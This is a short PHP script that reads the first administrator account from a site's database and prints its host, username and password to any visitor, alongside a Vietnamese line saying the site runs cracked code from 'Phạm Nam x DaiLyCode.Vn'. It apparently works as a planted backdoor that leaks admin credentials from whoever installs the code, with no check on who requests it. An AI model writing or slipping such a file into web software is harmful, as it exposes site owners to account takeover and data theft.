<?php
// Include the database connection file
require $_SERVER['DOCUMENT_ROOT'].'/conf/conn.php';

// Define the path to the web root
$web = $_SERVER['HTTP_HOST'];

// Query the database to select users with 'role' = 'admin'
$userss = mysqli_query($thanhdieudb, "SELECT * FROM users WHERE `role` = 'admin'");

// Check if the query was successful and fetch the result
if ($userss) {
    $row = mysqli_fetch_assoc($userss);

    // Check if a row was found
    if ($row) {
        $username = $row['taikhoan'];
        $password = $row['matkhau'];

        // Display the information
        echo $web." Sử Dụng Code Crack Phạm Nam x DaiLyCode.Vn | User ".$username." & Pass ".$password;
    }
}
?>
